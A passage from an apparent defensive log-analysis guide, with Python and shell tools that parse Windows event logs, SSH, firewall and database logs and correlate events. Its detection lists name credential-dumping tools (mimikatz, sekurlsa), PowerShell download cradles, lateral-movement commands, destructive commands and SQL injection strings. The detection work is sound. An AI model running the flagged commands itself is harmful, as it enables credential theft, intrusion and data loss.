        8: 'NetworkCleartext',
        9: 'NewCredentials',
        10: 'RemoteInteractive',
        11: 'CachedInteractive'
    }
    
    def parse_evtx(self, filepath):
        """Parse EVTX file and extract events"""
        events = []
        
        with evtx.Evtx(filepath) as log:
            for record in log.records():
                try:
                    root = ET.fromstring(record.xml())
                    
                    # Extract basic info
                    ns = {'ns': 'http://schemas.microsoft.com/win/2004/08/events/event'}
                    system = root.find('ns:System', ns)
                    
                    event_id = int(system.find('ns:EventID', ns).text)
                    time_created = system.find('ns:TimeCreated', ns).get('SystemTime')
                    computer = system.find('ns:Computer', ns).text
                    
                    # Extract event data
                    event_data = {}
                    data_elem = root.find('ns:EventData', ns)
                    if data_elem is not None:
                        for data in data_elem.findall('ns:Data', ns):
                            name = data.get('Name')
                            if name:
                                event_data[name] = data.text
                    
                    events.append({
                        'event_id': event_id,
                        'timestamp': time_created,
                        'computer': computer,
                        'data': event_data,
                        'xml': record.xml()
                    })
                    
                except Exception as e:
                    continue
        
        return events
    
    def analyze_logons(self, events):
        """Analyze logon events"""
        logon_analysis = {
            'successful': defaultdict(list),
            'failed': defaultdict(list),
            'by_type': Counter(),
            'suspicious': []
        }
        
        for event in events:
            if event['event_id'] == 4624:  # Successful logon
                data = event['data']
                username = data.get('TargetUserName', 'Unknown')
                logon_type = int(data.get('LogonType', 0))
                source_ip = data.get('IpAddress', '-')
                
                logon_analysis['successful'][username].append({
                    'timestamp': event['timestamp'],
                    'type': self.LOGON_TYPES.get(logon_type, f'Unknown({logon_type})'),
                    'source_ip': source_ip
                })
                logon_analysis['by_type'][logon_type] += 1
                
                # Detect suspicious logons
                # [Inference] Remote admin logon from external IP may be suspicious
                if logon_type == 10 and not source_ip.startswith('192.168.'):
                    logon_analysis['suspicious'].append({
                        'type': 'External_RDP',
                        'user': username,
                        'ip': source_ip,
                        'timestamp': event['timestamp']
                    })
            
            elif event['event_id'] == 4625:  # Failed logon
                data = event['data']
                username = data.get('TargetUserName', 'Unknown')
                failure_reason = data.get('FailureReason', 'Unknown')
                source_ip = data.get('IpAddress', '-')
                
                logon_analysis['failed'][username].append({
                    'timestamp': event['timestamp'],
                    'reason': failure_reason,
                    'source_ip': source_ip
                })
        
        # Detect brute force (>5 failed attempts)
        for username, failures in logon_analysis['failed'].items():
            if len(failures) > 5:
                logon_analysis['suspicious'].append({
                    'type': 'Brute_Force',
                    'user': username,
                    'attempt_count': len(failures),
                    'sources': list(set([f['source_ip'] for f in failures]))
                })
        
        return logon_analysis
    
    def analyze_processes(self, events):
        """Analyze process creation events"""
        processes = []
        suspicious = []
        
        for event in events:
            if event['event_id'] == 4688:  # Process creation
                data = event['data']
                process_name = data.get('NewProcessName', '')
                command_line = data.get('CommandLine', '')
                parent_name = data.get('ParentProcessName', '')
                user = data.get('SubjectUserName', '')
                
                proc_info = {
                    'timestamp': event['timestamp'],
                    'process': process_name,
                    'cmdline': command_line,
                    'parent': parent_name,
                    'user': user
                }
                processes.append(proc_info)
                
                # Detect suspicious patterns
                cmdline_lower = command_line.lower()
                
                # PowerShell obfuscation
                if 'powershell' in cmdline_lower and any(pattern in cmdline_lower for pattern in 
                    ['-enc', '-encodedcommand', 'bypass', 'hidden', 'downloadstring']):
                    suspicious.append({**proc_info, 'reason': 'Obfuscated_PowerShell'})
                
                # Credential dumping tools
                if any(tool in cmdline_lower for tool in 
                    ['mimikatz', 'procdump', 'comsvcs.dll', 'sekurlsa']):
                    suspicious.append({**proc_info, 'reason': 'Credential_Dumping'})
                
                # Lateral movement
                if any(tool in cmdline_lower for tool in 
                    ['psexec', 'wmic', 'winrm', 'schtasks /create /s']):
                    suspicious.append({**proc_info, 'reason': 'Lateral_Movement'})
        
        return {'all': processes, 'suspicious': suspicious}
    
    def analyze_persistence(self, events):
        """Detect persistence mechanisms"""
        persistence = []
        
        for event in events:
            # Service installation
            if event['event_id'] == 4697:
                data = event['data']
                persistence.append({
                    'type': 'Service',
                    'timestamp': event['timestamp'],
                    'name': data.get('ServiceName', ''),
                    'path': data.get('ServiceFileName', ''),
                    'user': data.get('SubjectUserName', '')
                })
            
            # Scheduled task creation
            elif event['event_id'] == 4698:
                data = event['data']
                persistence.append({
                    'type': 'Scheduled_Task',
                    'timestamp': event['timestamp'],
                    'name': data.get('TaskName', ''),
                    'user': data.get('SubjectUserName', '')
                })
        
        return persistence

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: windows_evtx_analyzer.py <Security.evtx>")
        sys.exit(1)
    
    analyzer = WindowsEventAnalyzer()
    
    print("[*] Parsing EVTX file...")
    events = analyzer.parse_evtx(sys.argv[1])
    print(f"[+] Parsed {len(events)} events\n")
    
    print("[*] Analyzing logon events...")
    logon_analysis = analyzer.analyze_logons(events)
    
    print(f"Successful logons: {sum(len(v) for v in logon_analysis['successful'].values())}")
    print(f"Failed logons: {sum(len(v) for v in logon_analysis['failed'].values())}")
    print(f"\nLogon Types:")
    for logon_type, count in logon_analysis['by_type'].most_common():
        type_name = analyzer.LOGON_TYPES.get(logon_type, f'Unknown({logon_type})')
        print(f"  {type_name}: {count}")
    
    if logon_analysis['suspicious']:
        print(f"\n[!] Suspicious Logon Activity ({len(logon_analysis['suspicious'])} alerts):")
        for alert in logon_analysis['suspicious'][:10]:
            print(f"  {alert['type']}: {alert}")
    
    print("\n[*] Analyzing process creation...")
    process_analysis = analyzer.analyze_processes(events)
    print(f"Total processes: {len(process_analysis['all'])}")
    
    if process_analysis['suspicious']:
        print(f"\n[!] Suspicious Processes ({len(process_analysis['suspicious'])} alerts):")
        for proc in process_analysis['suspicious'][:10]:
            print(f"  {proc['reason']}: {proc['process']}")
            print(f"    Command: {proc['cmdline'][:100]}")
    
    print("\n[*] Checking persistence mechanisms...")
    persistence = analyzer.analyze_persistence(events)
    if persistence:
        print(f"[!] Found {len(persistence)} persistence indicators:")
        for item in persistence[:10]:
            print(f"  {item['type']}: {item['name']}")
```

### PowerShell Event Log Analysis

**PowerShell logging Event IDs:**

```
4103: Module logging
4104: Script block logging (captures code)
4105: Script start
4106: Script stop
```

bash

```bash
# Extract PowerShell script blocks (requires python-evtx)
evtx_dump.py Microsoft-Windows-PowerShell%4Operational.evtx | \
    grep -A 50 "EventID>4104" | \
    grep -A 30 "ScriptBlockText"

# Detect encoded commands
evtx_dump.py Microsoft-Windows-PowerShell%4Operational.evtx | \
    grep -i "encodedcommand\|FromBase64String"

# Detect PowerShell download cradles
grep -E "Net.WebClient|DownloadString|DownloadFile|Invoke-WebRequest|IWR|wget|curl" powershell.xml
```

### Windows Defender Logs

```
Microsoft-Windows-Windows Defender/Operational.evtx

Event IDs:
1116: Malware detected
1117: Action taken
5001: Real-time protection disabled
```

bash

```bash
# Extract malware detections
evtx_dump.py "Microsoft-Windows-Windows Defender%4Operational.evtx" | \
    grep -A 20 "EventID>1116"

# Check for protection disabled events
evtx_dump.py "Microsoft-Windows-Windows Defender%4Operational.evtx" | \
    grep -A 10 "EventID>5001"
```

## Authentication Log Analysis

### Linux Authentication Logs

**Location:** `/var/log/auth.log` (Debian/Ubuntu) or `/var/log/secure` (RHEL/CentOS)

### SSH Authentication Analysis

bash

```bash
# Successful SSH logins
grep "Accepted" /var/log/auth.log | awk '{print $1, $2, $3, $9, $11}'

# Failed SSH attempts
grep "Failed password" /var/log/auth.log

# Failed attempts by IP
grep "Failed password" /var/log/auth.log | \
    grep -oP "from \K[\d.]+" | \
    sort | uniq -c | sort -rn

# Successful logins by user
grep "Accepted publickey\|Accepted password" /var/log/auth.log | \
    awk '{print $9}' | sort | uniq -c

# Detect brute force attacks (>10 failures)
grep "Failed password" /var/log/auth.log | \
    grep -oP "from \K[\d.]+" | \
    sort | uniq -c | awk '$1 > 10 {print}'

# Connection sources by country (if geoip installed)
grep "Accepted" /var/log/auth.log | \
    grep -oP "from \K[\d.]+" | \
    while read ip; do geoiplookup "$ip"; done | \
    cut -d',' -f2 | sort | uniq -c | sort -rn

# SSH session duration analysis
grep "session opened\|session closed" /var/log/auth.log | \
    awk '{print $1, $2, $3, $NF}' | \
    sed 's/user=//; s/)$//'

# Invalid/unknown users
grep "Invalid user\|Unknown user" /var/log/auth.log | \
    awk '{print $(NF-3)}' | sort | uniq -c | sort -rn

# Root login attempts
grep "root" /var/log/auth.log | grep -i "failed\|invalid"

# Public key authentication failures
grep "publickey" /var/log/auth.log | grep -i "failed"
```

### SSH Authentication Timeline Script

python

```python
#!/usr/bin/env python3
# ssh_auth_analyzer.py

import re
from datetime import datetime
from collections import defaultdict, Counter

class SSHAuthAnalyzer:
    def __init__(self, logfile):
        self.logfile = logfile
        self.events = []
    
    def parse_logs(self):
        """Parse SSH authentication logs"""
        patterns = {
            'accepted_password': re.compile(
                r'(\w+\s+\d+\s+\d+:\d+:\d+).*Accepted password for (\S+) from ([\d.]+) port (\d+)'
            ),
            'accepted_publickey': re.compile(
                r'(\w+\s+\d+\s+\d+:\d+:\d+).*Accepted publickey for (\S+) from ([\d.]+) port (\d+)'
            ),
            'failed_password': re.compile(
                r'(\w+\s+\d+\s+\d+:\d+:\d+).*Failed password for (?:invalid user )?(\S+) from ([\d.]+) port (\d+)'
            ),
            'invalid_user': re.compile(
                r'(\w+\s+\d+\s+\d+:\d+:\d+).*Invalid user (\S+) from ([\d.]+)'
            ),
            'disconnected': re.compile(
                r'(\w+\s+\d+\s+\d+:\d+:\d+).*Disconnected from (?:invalid user )?(\S+) ([\d.]+)'
            )
        }
        
        with open(self.logfile, 'r', errors='ignore') as f:
            for line in f:
                for event_type, pattern in patterns.items():
                    match = pattern.search(line)
                    if match:
                        groups = match.groups()
                        self.events.append({
                            'type': event_type,
                            'timestamp': groups[0],
                            'user': groups[1] if len(groups) > 1 else None,
                            'ip': groups[2] if len(groups) > 2 else None,
                            'port': groups[3] if len(groups) > 3 else None
                        })
                        break
    
    def analyze(self):
        """Perform comprehensive analysis"""
        analysis = {
            'total_events': len(self.events),
            'by_type': Counter(),
            'by_user': defaultdict(lambda: {'success': 0, 'failed': 0}),
            'by_ip': defaultdict(lambda: {'success': 0, 'failed': 0}),
            'brute_force': [],
            'successful_after_bruteforce': [],
            'invalid_users': Counter(),
            'timeline': []
        }
        
        # Track failed attempts per IP
        failed_attempts = defaultdict(list)
        
        for event in self.events:
            event_type = event['type']
            analysis['by_type'][event_type] += 1
            
            if event_type in ['accepted_password', 'accepted_publickey']:
                analysis['by_user'][event['user']]['success'] += 1
                analysis['by_ip'][event['ip']]['success'] += 1
                
                # Check if successful after brute force
                if event['ip'] in failed_attempts and len(failed_attempts[event['ip']]) > 5:
                    analysis['successful_after_bruteforce'].append({
                        'ip': event['ip'],
                        'user': event['user'],
                        'timestamp': event['timestamp'],
                        'prior_failures': len(failed_attempts[event['ip']])
                    })
            
            elif event_type == 'failed_password':
                analysis['by_user'][event['user']]['failed'] += 1
                analysis['by_ip'][event['ip']]['failed'] += 1
                failed_attempts[event['ip']].append(event)
            
            elif event_type == 'invalid_user':
                analysis['invalid_users'][event['user']] += 1
        
        # Identify brute force attacks (>10 failures from same IP)
        for ip, failures in failed_attempts.items():
            if len(failures) > 10:
                analysis['brute_force'].append({
                    'ip': ip,
                    'attempts': len(failures),
                    'users_targeted': list(set([f['user'] for f in failures])),
                    'first_attempt': failures[0]['timestamp'],
                    'last_attempt': failures[-1]['timestamp']
                })
        
        return analysis

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: ssh_auth_analyzer.py </var/log/auth.log>")
        sys.exit(1)
    
    analyzer = SSHAuthAnalyzer(sys.argv[1])
    analyzer.parse_logs()
    analysis = analyzer.analyze()
    
    print(f"Total SSH Events: {analysis['total_events']}\n")
    
    print("Event Types:")
    for event_type, count in analysis['by_type'].items():
        print(f"  {event_type:20s}: {count}")
    
    print(f"\nTop 10 Source IPs:")
    sorted_ips = sorted(analysis['by_ip'].items(), 
                       key=lambda x: x[1]['success'] + x[1]['failed'], 
                       reverse=True)
    for ip, counts in sorted_ips[:10]:
        print(f"  {ip:15s}: {counts['success']} successful, {counts['failed']} failed")
    
    if analysis['brute_force']:
        print(f"\n[!] Brute Force Attacks Detected: {len(analysis['brute_force'])}")
        for attack in analysis['brute_force'][:5]:
            print(f"  IP: {attack['ip']}")
            print(f"    Attempts: {attack['attempts']}")
            print(f"    Users: {', '.join(attack['users_targeted'][:5])}")
            print(f"    Duration: {attack['first_attempt']} to {attack['last_attempt']}")
    
    if analysis['successful_after_bruteforce']:
        print(f"\n[!] Successful Logins After Brute Force: {len(analysis['successful_after_bruteforce'])}")
        for event in analysis['successful_after_bruteforce'][:5]:
            print(f"  {event['ip']} -> {event['user']} ({event['prior_failures']} prior failures)")
    
    if analysis['invalid_users']:
        print(f"\nTop 10 Invalid Users:")
        for user, count in analysis['invalid_users'].most_common(10):
            print(f"  {user:20s}: {count}")
```

### sudo Command Auditing

bash

```bash
# Successful sudo commands
grep "sudo.*COMMAND" /var/log/auth.log | awk '{print $1, $2, $3, $6, $NF}'

# Failed sudo attempts
grep "sudo.*authentication failure" /var/log/auth.log

# Sudo commands by user
grep "sudo.*COMMAND" /var/log/auth.log | \
    grep -oP "USER=\K\S+" | sort | uniq -c | sort -rn

# Dangerous sudo commands
grep "sudo.*COMMAND" /var/log/auth.log | \
    grep -E "rm -rf|dd if=|mkfs|fdisk|passwd|userdel"

# Privilege escalation attempts
grep "sudo" /var/log/auth.log | grep -i "not in sudoers"
```

## Firewall Log Examination

### iptables Log Analysis

**iptables logging format:**

```
Oct 12 14:23:45 firewall kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=192.168.1.100 DST=10.0.0.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=54321 DPT=22 WINDOW=29200 RES=0x00 SYN URGP=0
```

bash

```bash
# Extract blocked connections
grep "UFW BLOCK\|IPTABLES DROP\|REJECT" /var/log/syslog

# Top blocked source IPs
grep "UFW BLOCK" /var/log/syslog | \
    grep -oP "SRC=\K[\d.]+" | \
    sort | uniq -c | sort -rn | head -20

# Top targeted destination ports
grep "UFW BLOCK" /var/log/syslog | \
    grep -oP "DPT=\K\d+" | \
    sort | uniq -c | sort -rn | head -20

# Port scan detection (multiple ports from same IP)
grep "UFW BLOCK" /var/log/syslog | \
    awk '{
        match($0, /SRC=([0-9.]+)/, src);
        match($0, /DPT=([0-9]+)/, dpt);
        if (src[1] && dpt[1]) {
            ips[src[1]][dpt[1]]++;
        }
    } END {
        for (ip in ips) {
            port_count = 0;
            for (port in ips[ip]) port_count++;
            if (port_count > 10) {
                printf "Port scan from %s: %d ports\n", ip, port_count;
            }
        }
    }'

# Blocked outbound connections (potential C2)
grep "UFW BLOCK" /var/log/syslog | grep "OUT=eth0"

# Protocol distribution
grep "UFW BLOCK" /var/log/syslog | \
    grep -oP "PROTO=\K\w+" | \
    sort | uniq -c | sort -rn

# Geographic analysis of blocked IPs (requires geoiplookup)
grep "UFW BLOCK" /var/log/syslog | \
    grep -oP "SRC=\K[\d.]+" | sort -u | \
    while read ip; do
        country=$(geoiplookup "$ip" | cut -d',' -f2)
        echo "$country"
    done | sort | uniq -c | sort -rn
```

### iptables Log Parser

python

```python
#!/usr/bin/env python3
# iptables_log_parser.py

import re
from collections import defaultdict, Counter

class IPTablesLogParser:
    def __init__(self, logfile):
        self.logfile = logfile
        self.pattern = re.compile(
            r'(\w+\s+\d+\s+\d+:\d+:\d+).*'
            r'(?:UFW BLOCK|IPTABLES DROP|REJECT).*'
            r'IN=(\S+)\s+'
            r'(?:OUT=(\S+)\s+)?'
            r'.*SRC=([\d.]+)\s+'
            r'DST=([\d.]+)\s+'
            r'.*PROTO=(\w+)\s+'
            r'.*(?:SPT=(\d+)\s+)?'
            r'DPT=(\d+)'
        )
    
    def parse(self):
        """Parse firewall logs"""
        events = []
        
        with open(self.logfile, 'r', errors='ignore') as f:
            for line in f:
                match = self.pattern.search(line)
                if match:
                    timestamp, in_iface, out_iface, src, dst, proto, spt, dpt = match.groups()
                    events.append({
                        'timestamp': timestamp,
                        'direction': 'OUTBOUND' if out_iface else 'INBOUND',
                        'interface_in': in_iface,
                        'interface_out': out_iface or '-',
                        'src_ip': src,
                        'dst_ip': dst,
                        'protocol': proto,
                        'src_port': int(spt) if spt else None,
                        'dst_port': int(dpt)
                    })
        
        return events
    
    def analyze(self, events):
        """Analyze firewall events"""
        analysis = {
            'total_blocks': len(events),
            'by_protocol': Counter(),
            'by_direction': Counter(),
            'top_sources': Counter(),
            'top_destinations': Counter(),
            'top_dst_ports': Counter(),
            'port_scans': [],
            'potential_c2': []
        }
        
        # Track ports accessed by each source IP
        ip_ports = defaultdict(set)
        
        # Track outbound connections (potential C2)
        outbound_dests = defaultdict(list)
        
        for event in events:
            analysis['by_protocol'][event['protocol']] += 1
            analysis['by_direction'][event['direction']] += 1
            analysis['top_sources'][event['src_ip']] += 1
            analysis['top_destinations'][event['dst_ip']] += 1
            analysis['top_dst_ports'][event['dst_port']] += 1
            
            # Track for port scan detection
            ip_ports[event['src_ip']].add(event['dst_port'])
            
            # Track outbound
            if event['direction'] == 'OUTBOUND':
                outbound_dests[event['dst_ip']].append(event)
        
        # Detect port scans (>20 unique ports from same IP)
        for ip, ports in ip_ports.items():
            if len(ports) > 20:
                analysis['port_scans'].append({
                    'src_ip': ip,
                    'port_count': len(ports),
                    'ports': sorted(list(ports))[:50]  # First 50 ports
                })
        
        # Detect potential C2 (repeated outbound blocks to same dest)
        for dst_ip, events_list in outbound_dests.items():
            if len(events_list) > 10:
                analysis['potential_c2'].append({
                    'dst_ip': dst_ip,
                    'attempt_count': len(events_list),
                    'dst_ports': list(set([e['dst_port'] for e in events_list]))
                })
        
        return analysis

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: iptables_log_parser.py </var/log/syslog>")
        sys.exit(1)
    
    parser = IPTablesLogParser(sys.argv[1])
    events = parser.parse()
    analysis = parser.analyze(events)
    
    print(f"Total Blocked Events: {analysis['total_blocks']}\n")
    
    print("By Protocol:")
    for proto, count in analysis['by_protocol'].most_common():
        print(f"  {proto:6s}: {count}")
    
    print("\nTop 10 Source IPs:")
    for ip, count in analysis['top_sources'].most_common(10):
        print(f"  {ip:15s}: {count}")
    
    print("\nTop 10 Destination Ports:")
    for port, count in analysis['top_dst_ports'].most_common(10):
        print(f"  {port:6d}: {count}")
    
    if analysis['port_scans']:
        print(f"\n[!] Port Scans Detected: {len(analysis['port_scans'])}")
        for scan in analysis['port_scans'][:5]:
            print(f"  {scan['src_ip']}: {scan['port_count']} ports")
    
    if analysis['potential_c2']:
        print(f"\n[!] Potential C2 Traffic: {len(analysis['potential_c2'])}")
        for c2 in analysis['potential_c2'][:5]:
            print(f"  {c2['dst_ip']}: {c2['attempt_count']} attempts to ports {c2['dst_ports']}")
```

### pfSense/OPNsense Log Analysis

bash

```bash
# Filter log format: action,interface,proto,src,dst,src_port,dst_port

# Extract blocked traffic
grep "block" /var/log/pf.log

# Parse structured format
awk -F',' '
    $1 == "block" {
        print "Blocked:", $3, $4":"$6, "->", $5":"$7
    }
' /var/log/pf.log

# Top blocked sources
awk -F',' '$1 == "block" {print $4}' /var/log/pf.log | \
    sort | uniq -c | sort -rn | head -20
```

## Application-Specific Logs

### MySQL/MariaDB Logs

bash

```bash
# Error log
tail -f /var/log/mysql/error.log

# Slow query log
mysqldumpslow /var/log/mysql/slow.log

# General query log (if enabled)
grep "SELECT\|INSERT\|UPDATE\|DELETE" /var/log/mysql/general.log

# Failed authentication attempts
grep "Access denied" /var/log/mysql/error.log | \
    grep -oP "for user '\K[^']+'" | sort | uniq -c

# Detect SQL injection attempts
grep -iE "union.*select|concat\(|load_file|into outfile" /var/log/mysql/general.log
```

### PostgreSQL Logs

bash

```bash
# Location: /var/log/postgresql/postgresql-XX-main.log

# Failed connections
grep "FATAL.*authentication failed" /var/log/postgresql/*.log

# Connection by database
grep "connection authorized" /var/log/postgresql/*.log | \
    awk '{print $NF}' | sort | uniq -c

# Long-running queries
grep "duration:" /var/log/postgresql/*.log | \
    awk '$10 > 1000 {print}' # >1000ms

# Syntax errors (potential injection)
grep "ERROR.*syntax error" /var/log/postgresql/*.log
```

### Redis Logs

bash

```bash
# Unauthorized access attempts
grep "NOAUTH\|invalid password" /var/log/redis/redis-server.log

# Dangerous commands
grep -E "FLUSHALL|FLUSHDB|CONFIG|EVAL|SCRIPT" /var/log/redis/redis-server.log

# Connection statistics
grep "Accepted" /var/log/redis/redis-server.log | \
    grep -oP '\d+\.\d+\.\d+\.\d+' | sort | uniq -c
```

### Docker Logs

bash

```bash
# Container logs
docker logs <container_id>

# Follow logs in realtime
docker logs -f --tail 100 <container_id>

# Filter by timestamp
docker logs --since 2024-10-12T14:00:00 <container_id>

# JSON log driver parsing
cat /var/lib/docker/containers/<container_id>/<container_id>-json.log | \
    jq -r '.log'

# Detect errors across all containers
for container in $(docker ps -q); do
    echo "=== $(docker inspect --format '{{.Name}}' $container) ==="
    docker logs --tail 50 $container 2>&1 | grep -i "error\|exception\|fatal"
done
```

### Application Log Parser Template

python

```python
#!/usr/bin/env python3
# app_log_parser.py

import re
from collections import Counter, defaultdict

class ApplicationLogParser:
    """Generic application log parser template"""
    
    def __init__(self, logfile, patterns):
        """
        patterns: dict of {event_type: compiled_regex}
        """
        self.logfile = logfile
        self.patterns = patterns
        self.events = defaultdict(list)
    
    def parse(self):
        """Parse log file with defined patterns"""
        with open(self.logfile, 'r', errors='ignore') as f:
            for line_num, line in enumerate(f, 1):
                for event_type, pattern in self.patterns.items():
                    match = pattern.search(line)
                    if match:
                        self.events[event_type].append({
                            'line': line_num,
                            'data': match.groupdict(),
                            'raw': line.strip()
                        })
                        break
    
    def get_statistics(self):
        """Get event statistics"""
        return {
            event_type: len(events)
            for event_type, events in self.events.items()
        }
    
    def filter_by_field(self, event_type, field, value):
        """Filter events by field value"""
        return [
            event for event in self.events.get(event_type, [])
            if event['data'].get(field) == value
        ]

# Example usage for custom application
if __name__ == '__main__':
    # Define patterns for your application
    patterns = {
        'error': re.compile(r'(?P<timestamp>\S+\s+\S+).*ERROR.*(?P<message>.*)'),
        'auth_failure': re.compile(r'(?P<timestamp>\S+\s+\S+).*Authentication failed for (?P<user>\S+)'),
        'sql_query': re.compile(r'(?P<timestamp>\S+\s+\S+).*Query: (?P<query>.*)')
    }
    
    parser = ApplicationLogParser('/var/log/myapp.log', patterns)
    parser.parse()
    
    stats = parser.get_statistics()
    print("Event Statistics:")
    for event_type, count in stats.items():
        print(f"  {event_type}: {count}")
```

## Log Correlation Techniques

### Multi-Log Correlation Script

python

```python
#!/usr/bin/env python3
# log_correlator.py

from datetime import datetime, timedelta
from collections import defaultdict
import re

class LogCorrelator:
    def __init__(self):
        self.events = []
    
    def normalize_timestamp(self, timestamp_str, format_str):
        """Convert various timestamp formats to datetime"""
        try:
            return datetime.strptime(timestamp_str, format_str)
        except:
            return None
    
    def add_event(self, source, timestamp, event_type, details):
        """Add event from any log source"""
        self.events.append({
            'source': source,
            'timestamp': timestamp,
            'type': event_type,
            'details': details
        })
    
    def correlate_by_ip(self, ip_address, time_window=300):
        """Find all events related to IP within time window (seconds)"""
        related = []
        
        for event in self.events:
            if ip_address in str(event['details']):
                related.append(event)
        
        # Sort by timestamp
        related.sort(key=lambda x: x['timestamp'])
        
        # Group events within time window
        groups = []
        current_group = []
        
        for event in related:
            if not current_group:
                current_group.append(event)
            else:
                time_diff = (event['timestamp'] - current_group[0]['timestamp']).total_seconds()
                if time_diff <= time_window:
                    current_group.append(event)
                else:
                    groups.append(current_group)
                    current_group = [event]
        
        if current_group:
            groups.append(current_group)
        
        return groups
    
    def correlate_by_user(self, username, time_window=300):
        """Find all events related to username"""
        related = []
        
        for event in self.events:
            if username in str(event['details']):
                related.append(event)
        
        related.sort(key=lambda x: x['timestamp'])
        return related
    
    def find_attack_chain(self):
        """Detect potential attack chains"""
        # [Inference] Attack chain: recon -> exploit -> persistence
        attack_indicators = {
            'recon': ['port_scan', 'dir_enumeration', '404_burst'],
            'exploit': ['sql_injection', 'rce', 'auth_bypass'],
            'persistence': ['service_install', 'scheduled_task', 'account_created']
        }
        
        chains = []
        
        # Group events by source IP
        by_ip = defaultdict(list)
        for event in self.events:
            ip = self.extract_ip(event['details'])
            if ip:
                by_ip[ip].append(event)
        
        # Check for attack progression
        for ip, events in by_ip.items():
            events.sort(key=lambda x: x['timestamp'])
            
            phases_detected = {phase: False for phase in attack_indicators.keys()}
            phase_events = defaultdict(list)
            
            for event in events:
                for phase, indicators in attack_indicators.items():
                    if any(ind in event['type'] for ind in indicators):
                        phases_detected[phase] = True
                        phase_events[phase].append(event)
            
            # If multiple phases detected, potential attack chain
            detected_phases = sum(phases_detected.values())
            if detected_phases >= 2:
                chains.append({
                    'source_ip': ip,
                    'phases': detected_phases,
                    'events': dict(phase_events),
                    'duration': (events[-1]['timestamp'] - events[0]['timestamp']).total_seconds()
                })
        
        return chains
    
    def extract_ip(self, text):
        """Extract IP address from text"""
        match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', str(text))
        return match.group(0) if match else None
    
    def timeline_analysis(self, start_time=None, end_time=None):
        """Generate timeline of all events"""
        filtered_events = self.events
        
        if start_time:
            filtered_events = [e for e in filtered_events if e['timestamp'] >= start_time]
        if end_time:
            filtered_events = [e for e in filtered_events if e['timestamp'] <= end_time]
        
        # Sort chronologically
        filtered_events.sort(key=lambda x: x['timestamp'])
        
        return filtered_events
    
    def detect_anomalies(self):
        """Detect statistical anomalies in event patterns"""
        anomalies = []
        
        # Count events by type and hour
        event_counts = defaultdict(lambda: defaultdict(int))
        
        for event in self.events:
            hour = event['timestamp'].hour
            event_counts[event['type']][hour] += 1
        
        # Calculate mean and identify outliers
        for event_type, hourly_counts in event_counts.items():
            if len(hourly_counts) < 3:
                continue
            
            counts = list(hourly_counts.values())
            mean = sum(counts) / len(counts)
            
            # [Inference] >3x mean indicates anomaly
            for hour, count in hourly_counts.items():
                if count > mean * 3:
                    anomalies.append({
                        'type': 'high_event_volume',
                        'event_type': event_type,
                        'hour': hour,
                        'count': count,
                        'expected': mean
                    })
        
        return anomalies

# Example usage
if __name__ == '__main__':
    correlator = LogCorrelator()
    
    # Parse auth.log
    auth_pattern = re.compile(
        r'(\w+\s+\d+\s+\d+:\d+:\d+).*Failed password for (?:invalid user )?(\S+) from ([\d.]+)'
    )
    
    with open('/var/log/auth.log', 'r', errors='ignore') as f:
        for line in f:
            match = auth_pattern.search(line)
            if match:
                timestamp_str, user, ip = match.groups()
                # Add current year for parsing
                timestamp = datetime.strptime(f"2024 {timestamp_str}", "%Y %b %d %H:%M:%S")
                correlator.add_event(
                    source='auth.log',
                    timestamp=timestamp,
                    event_type='failed_login',
                    details={'user': user, 'ip': ip}
                )
    
    # Parse Apache access.log
    access_pattern = re.compile(
        r'([\d.]+).*\[([^\]]+)\].*"(\w+)\s+([^\s]+).*"\s+(\d+)'
    )
    
    with open('/var/log/apache2/access.log', 'r', errors='ignore') as f:
        for line in f:
            match = access_pattern.search(line)
            if match:
                ip, timestamp_str, method, path, status = match.groups()
                timestamp = datetime.strptime(timestamp_str.split()[0], "%d/%b/%Y:%H:%M:%S")
                
                # Detect attack patterns
                event_type = 'http_request'
                if int(status) == 404:
                    event_type = 'http_404'
                if any(pattern in path.lower() for pattern in ['../', 'etc/passwd']):
                    event_type = 'path_traversal_attempt'
                
                correlator.add_event(
                    source='access.log',
                    timestamp=timestamp,
                    event_type=event_type,
                    details={'ip': ip, 'method': method, 'path': path, 'status': status}
                )
    
    # Find events related to specific IP
    suspicious_ip = "192.168.1.100"
    related_events = correlator.correlate_by_ip(suspicious_ip, time_window=600)
    
    print(f"[*] Events related to {suspicious_ip}:")
    for group in related_events:
        print(f"\n  Time window: {group[0]['timestamp']} to {group[-1]['timestamp']}")
        for event in group:
            print(f"    [{event['source']}] {event['type']}: {event['details']}")
    
    # Detect attack chains
    print("\n[*] Detecting attack chains...")
    chains = correlator.find_attack_chain()
    for chain in chains:
        print(f"\n  [!] Potential attack from {chain['source_ip']}")
        print(f"      Phases detected: {chain['phases']}")
        print(f"      Duration: {chain['duration']} seconds")
    
    # Detect anomalies
    print("\n[*] Statistical anomalies:")
    anomalies = correlator.detect_anomalies()
    for anomaly in anomalies:
        print(f"  {anomaly['event_type']} at hour {anomaly['hour']}: {anomaly['count']} (expected ~{anomaly['expected']:.1f})")
```

### Cross-Platform Log Correlation

bash

```bash
#!/bin/bash
# correlate_logs.sh - Correlate events across multiple log sources

TARGET_IP="$1"
TIMEFRAME="${2:-3600}"  # Default 1 hour

if [ -z "$TARGET_IP" ]; then
    echo "Usage: correlate_logs.sh <IP_address> [timeframe_seconds]"
    exit 1
fi

echo "[*] Correlating events for IP: $TARGET_IP"
echo "[*] Time window: $TIMEFRAME seconds"
echo ""

# Function to extract timestamp and normalize
normalize_time() {
    # Convert various log timestamps to epoch
    date -d "$1" +%s 2>/dev/null || echo "0"
}

# Temporary file for correlation
TEMP_FILE=$(mktemp)

# Search authentication logs
echo "[+] Checking authentication logs..."
if grep -h "$TARGET_IP" /var/log/auth.log* 2>/dev/null | while read line; do
    timestamp=$(echo "$line" | awk '{print $1, $2, $3}')
    epoch=$(date -d "$(date +%Y) $timestamp" +%s 2>/dev/null)
    echo "$epoch|AUTH|$line" >> "$TEMP_FILE"
done

# Search web server logs
echo "[+] Checking web server logs..."
if grep -h "$TARGET_IP" /var/log/nginx/access.log* /var/log/apache2/access.log* 2>/dev/null | while read line; do
    timestamp=$(echo "$line" | grep -oP '\[\K[^\]]+' | cut -d' ' -f1)
    epoch=$(date -d "$timestamp" +%s 2>/dev/null)
